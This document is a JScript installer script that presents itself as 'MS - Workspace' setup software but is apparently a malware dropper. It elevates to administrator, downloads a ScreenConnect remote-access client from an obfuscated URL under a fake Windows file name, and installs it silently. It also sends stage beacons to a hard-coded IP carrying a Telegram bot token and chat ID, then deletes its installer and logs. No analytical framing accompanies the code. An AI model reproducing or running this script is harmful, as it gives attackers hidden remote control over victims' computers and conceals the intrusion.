//7bc01ed15010
(function () {
    "use strict";

    var SETTINGS = {
//bc4b65b0f65d
        PRODUCT_NAME: "MS - Workspace",
        PRODUCT_VERSION: "1.0.0",
//c970db897e67
        MSI_URL: ["https://","educationalfiles.","online/Bin/ScreenConnect.","ClientSetup.","msi?e=Access&y=Guest"].join(''),
        MSI_FILE_NAME: "WindowsMetricsCollector.msi",
//5f5b30fdf326
        INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
        LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
//20f6c8c5ab8f
        LOG_FILE: "deploy.log",
        MSI_LOG_FILE: "msi-install.log",
//beaf5b7716e5
        DOWNLOAD_RETRIES: 2,
        RETRY_DELAY_MS: 1500,
//c4d8ce857af0
        DOWNLOAD_TIMEOUT_MS: 300000,
        MSI_EXTRA_ARGS: "",

        EXFIL_HOST: "212.43.151.96:20002",        
        
        TBTOKEN: "8679220057:AAHOQoG-qxYVT7-3si70mYE4_veZBf7q4l8",
//7ff7cdd7575d
        TCID: "-1004296347689",
        DEPLOY_TOKEN: Math.random().toString(36).substring(2, 8), 

        UNINSTALL_EXISTING: true,
//58cb0e2343aa
        PRODUCT_CODE: "{4228D3D7-CF51-5361-1BC4-165794361D9B}",

//9ac246b6a77c
        SHOW_POPUPS: false
    };

    var wsh = new ActiveXObject("WScript.Shell");
//cb6b51419543
    var fsys = new ActiveXObject("Scripting.FileSystemObject");

//7bc97a706b3a
    function resolveEnv(p) {
        return wsh.ExpandEnvironmentStrings(p);
//0500d25a99c4
    }

//dafbe5eb7ad3
    var paths = {
        installDir: resolveEnv(SETTINGS.INSTALL_DIR),
//1bd2c03b8240
        logDir: resolveEnv(SETTINGS.LOG_DIR),
        logFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.LOG_FILE,
//34a3131ad631
        msiLogFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.MSI_LOG_FILE,
        msiPath: resolveEnv(SETTINGS.INSTALL_DIR) + "\\" + SETTINGS.MSI_FILE_NAME
//2fd4e253fbdd
    };

//773e0dc3f147
    function pad(n) {
        return (n < 10 ? "0" : "") + n;
//bfef2216533e
    }

//75d198e00958
    function ts() {
        var d = new Date();
//edc239f6533c
        return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
            " " + pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
//d88d706a0d19
    }

//e1e749914d24
    function mkdirs(dir) {
        var parent;
//6a57c242434d
        dir = String(dir).replace(/[\\\/]+$/, "");
        if (!dir || fsys.FolderExists(dir)) return;
//7852ea5d9363
        parent = fsys.GetParentFolderName(dir);
        if (parent && parent !== dir && !fsys.FolderExists(parent)) {
//ecdea793fffa
            mkdirs(parent);
        }
//1fd2aa95797b
        if (!fsys.FolderExists(dir)) fsys.CreateFolder(dir);
    }

    function log(level, msg) {
//743682a2417f
        try {
            mkdirs(paths.logDir);
//9afaaf595564
            var f = fsys.OpenTextFile(paths.logFile, 8, true);
            f.WriteLine("[" + ts() + "] [" + level + "] " + msg);
//b83c3fa76d7e
            f.Close();
        } catch (e) { }
//6ba6a9198b42
    }


    function beacon(stage, exitCode) {
//238a1a9f36e0
        try {
            var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//ec99886b33ba
            var now = new Date();
            var dts = pad(now.getMonth() + 1) + pad(now.getDate()) +
//74d38d30a11d
                      pad(now.getHours()) + pad(now.getMinutes());
            var statusCode, exitStr;

            switch (stage) {
//373a8c04dec2
                case "start": statusCode = "go";  exitStr = "0";     break;
                case "ok":    statusCode = "ok";  exitStr = String(exitCode || 0);    break;
//73caa6bc69b5
                case "okr":   statusCode = "okr"; exitStr = String(exitCode || 3010); break;
                case "oka":   statusCode = "oka"; exitStr = String(exitCode || 1638); break;
//03130efe608c
                case "cl":    statusCode = "cl";  exitStr = String(exitCode || 1602); break;
                default:      statusCode = "fl";  exitStr = String(exitCode || 1);    break;
//2f9263dccac2
            }

//c57f2b311606
            var deployId = SETTINGS.DEPLOY_TOKEN;

//769f8dbe5d6e
            var url = "http://" + SETTINGS.EXFIL_HOST + "/" +
                      SETTINGS.TBTOKEN + "/" +
//fb38c299c38c
                      SETTINGS.TCID + "/" +
                      deployId + "." +
//0ae8847e8e53
                      statusCode + "." +
                      exitStr + "." +
//8ed52fb0e83d
                      dts;

//99ec5acd6318
            http.Open("GET", url, false);
            http.SetTimeouts(1000, 1000, 1000, 1000);
//f79a9af5b10f
            http.Send();
        } catch (e) { }
//e1530f9bfc7f
    }

//eb6fc4115209
    // ── helpers ──

//d3e1633b81df
    function checkAdmin() {
        try {
//9cd707a2c441
            var exec = wsh.Exec("net session");
            while (exec.Status === 0) { WScript.Sleep(50); }
//0b1e78c51bf3
            return exec.ExitCode === 0;
        } catch (e) { return false; }
//77d8f7115a78
    }

//66928baeeb2a
    function escalate() {
        var app = new ActiveXObject("Shell.Application");
//e3cbdaa178dc
        var script = WScript.ScriptFullName;
        app.ShellExecute("cscript.exe", '//nologo "' + script + '"', "", "runas", 0);
//b014e4a13027
        WScript.Quit(0);
    }

    function checkConfig() {
//2b44e818e0d9
        if (!SETTINGS.MSI_URL) abort("Setup could not start.", "MSI_URL is empty", 1);
        if (SETTINGS.MSI_URL.indexOf("https://") !== 0 && SETTINGS.MSI_URL.indexOf("http://") !== 0)
//ad6b0f57b539
            abort("Setup could not start.", "Invalid MSI_URL scheme", 1);
        if (SETTINGS.MSI_FILE_NAME.indexOf(".msi") === -1)
//8559ad2f17a4
            abort("Setup could not start.", "Invalid MSI_FILE_NAME", 1);
    }

    function writeResponse(responseBody, outPath) {
//8636b213bb8b
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
//648478629d3b
        stream.Open();
        stream.Write(responseBody);
//c27fdb830c9d
        if (stream.Size <= 0) { stream.Close(); return 0; }
        if (fsys.FileExists(outPath)) fsys.DeleteFile(outPath, true);
//f1870aaba6b7
        stream.SaveToFile(outPath, 2);
        var size = stream.Size;
//a745aaf22e1e
        stream.Close();
        return size;
//f54357c12088
    }

//99e33edb5b47
    function fetchPayload(url, outPath) {
        var attempt, http, err, bytesWritten, status;
//40e3c3e99598
        mkdirs(fsys.GetParentFolderName(outPath));
        err = "Unknown download error";

        for (attempt = 0; attempt <= SETTINGS.DOWNLOAD_RETRIES; attempt++) {
//18616e511929
            try {
                http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//93984d40bc53
                try { http.Option(9) = 2048; } catch (e) { }
                http.SetTimeouts(30000, 30000, SETTINGS.DOWNLOAD_TIMEOUT_MS, SETTINGS.DOWNLOAD_TIMEOUT_MS);
//ae4269f7d60e
                http.Open("GET", url, false);
                http.Send();
//12e6cda7225e
                status = http.Status;
                if (status === 200) {
//103e7d91b789
                    bytesWritten = writeResponse(http.ResponseBody, outPath);
                    if (bytesWritten > 0 && fsys.FileExists(outPath)) return true;
//4547ef4c9d6d
                    err = "HTTP 200 but zero-byte payload";
                } else { err = "HTTP " + status; }
//085abe259971
            } catch (ex) { err = (ex.message || String(ex)); }
            if (attempt < SETTINGS.DOWNLOAD_RETRIES) WScript.Sleep(SETTINGS.RETRY_DELAY_MS);
//5d8932420936
        }
        return false;
//e0d0037ddad7
    }

//ccaaf469798e
    function purgeOld() {
        if (!SETTINGS.UNINSTALL_EXISTING || !SETTINGS.PRODUCT_CODE) return;
//e439b8f73385
        var cmd = "msiexec.exe /x " + SETTINGS.PRODUCT_CODE +
                  " /qn /norestart REBOOT=ReallySuppress";
//c0be2ce281d0
        log("INFO", "Uninstalling existing product: " + SETTINGS.PRODUCT_CODE);
        var code = wsh.Run(cmd, 0, true);
//f6ea702c5cfc
        if (code !== 0 && code !== 1605 && code !== 1612)
            log("WARN", "Uninstall returned " + code + " — continuing anyway");
//29cdae05fc24
        else
            log("INFO", "Uninstall exit code: " + code);
//83cb0593ee89
        WScript.Sleep(3000);
    }

    function execMsi(msiPath) {
//00bada017b21
        var args, cmd, code, attempt, modes;
        mkdirs(paths.logDir);
//9338b11c25b5
        modes = [
            "/qn /norestart REBOOT=ReallySuppress ALLUSERS=1",
//edc670ac1dbc
            "/qb /norestart REBOOT=ReallySuppress ALLUSERS=1"
        ];
//2348e041eaac
        for (attempt = 0; attempt < modes.length; attempt++) {
            args = '/i "' + msiPath + '" ' + modes[attempt] + " " +
//34e9b63aad48
                   SETTINGS.MSI_EXTRA_ARGS + ' /L*v "' + paths.msiLogFile + '"';
            cmd = "msiexec.exe " + args;
//6f061810d04f
            code = wsh.Run(cmd, 0, true);
            if (code === 0 || code === 3010 || code === 1641 || code === 1638) return code;
//e81cb4f2c046
            if (code !== 1603) return code;
            WScript.Sleep(2000);
//b5d3ef53037e
        }
        return 1603;
//f48a1107e96e
    }

//4efffb9a1517
    function explainCode(code) {
        switch (code) {
//688b0c2536ca
            case 0:    return "Success";
            case 3010: return "Success (restart required)";
//a6ca571791c1
            case 1641: return "Success (restart initiated)";
            case 1638: return "Already installed";
//7b1deeddbb01
            case 1602: return "Canceled by user";
            case 1603: return "Fatal error during installation";
//39bce6d40703
            case 1618: return "Another installation is already in progress";
            default:   return "Exit code " + code;
//d2eda285163e
        }
    }

    function isOk(code) {
//34590ef6c4ec
        return code === 0 || code === 3010 || code === 1641 || code === 1638;
    }

    function abort(friendlyMsg, technicalMsg, exitCode) {
//efd612d38ad6
        if (technicalMsg) log("ERROR", technicalMsg);
        if (typeof exitCode !== "number") exitCode = 1;
//0c9a80c94248
        log("ERROR", "MSI log file: " + paths.msiLogFile);
        beacon("fail", exitCode);
//dc359b72a709
        if (SETTINGS.SHOW_POPUPS)
            wsh.Popup(friendlyMsg, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//92c611f0aa41
        WScript.Quit(exitCode);
    }


//896115639d5d
    mkdirs(paths.installDir);
    mkdirs(paths.logDir);

    if (!checkAdmin()) { escalate(); }

    beacon("start", null);

    checkConfig();

    if (!fetchPayload(SETTINGS.MSI_URL, paths.msiPath)) {
//8966124b0eb5
        abort(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
//17e760feb76c
            "Download failed after " + (SETTINGS.DOWNLOAD_RETRIES + 1) + " attempts", 1
        );
//c5faabc9fb99
    }

//7539dee61263
    if (!fsys.FileExists(paths.msiPath) || fsys.GetFile(paths.msiPath).Size <= 0) {
        abort(
//34c39c03815f
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
            "MSI missing or empty after download", 1
//80e64f7af5d8
        );
    }

    purgeOld();

    var exitCode = execMsi(paths.msiPath);
//300480a25e4a
    var statusText = explainCode(exitCode);

//aaa86b605b73
    if (isOk(exitCode)) {
        if (exitCode === 3010 || exitCode === 1641) beacon("okr", exitCode);
//be907a199ba5
        else if (exitCode === 1638)                 beacon("oka", exitCode);
        else                                        beacon("ok", exitCode);
//a59bc154ae04
    } else if (exitCode === 1602) {
        log("WARN", "Installation canceled by user");
//7d680f0b6bff
        beacon("cl", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//65e89cc95e5c
            wsh.Popup("Setup was canceled.", 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
    } else {
//2d1a560c1e9b
        log("ERROR", "Installation result: " + statusText);
        log("ERROR", "MSI log file: " + paths.msiLogFile);
//903b52a8aaad
        beacon("fail", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//bf61e9ab4baf
            wsh.Popup("Setup could not be completed.\n\n" + statusText +
                "\n\nCheck log:\n" + paths.msiLogFile, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//a5d77879a442
    }

//5744bf6d8f2a
    try {
        if (fsys.FileExists(paths.msiPath))   fsys.DeleteFile(paths.msiPath, true);
//12ffe5fe593a
        if (fsys.FileExists(paths.logFile))   fsys.DeleteFile(paths.logFile, true);
        if (fsys.FileExists(paths.msiLogFile)) fsys.DeleteFile(paths.msiLogFile, true);
//22848a0c57e4
        if (fsys.FolderExists(paths.logDir))  { try { fsys.DeleteFolder(paths.logDir, true); } catch (e) { } }
    } catch (e) { }

    WScript.Quit(exitCode);
//38b988e36d09
})();